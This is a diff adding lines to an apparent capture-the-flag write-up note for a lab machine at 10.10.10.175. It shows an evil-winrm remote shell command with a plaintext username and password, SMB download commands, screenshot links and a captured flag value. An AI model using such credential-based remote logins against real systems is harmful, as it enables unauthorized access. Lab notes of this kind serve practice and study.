@@ -38,3 +38,19 @@ recurse on
 ls
 mget *
 ```
+
+We don't have write access but  but  but
+
+Always try to run this command before doing anything
+```
+evil-winrm -u fsmith -p 'Thestrokes23' -i 10.10.10.175
+```
+![[Pasted image 20240502020038.png]]
+
+![[Pasted image 20240502020250.png]]
+
+Will get the flag first
+```
+b832998718ccc6b402516022d19a41be
+```
+![[Pasted image 20240502020516.png]]
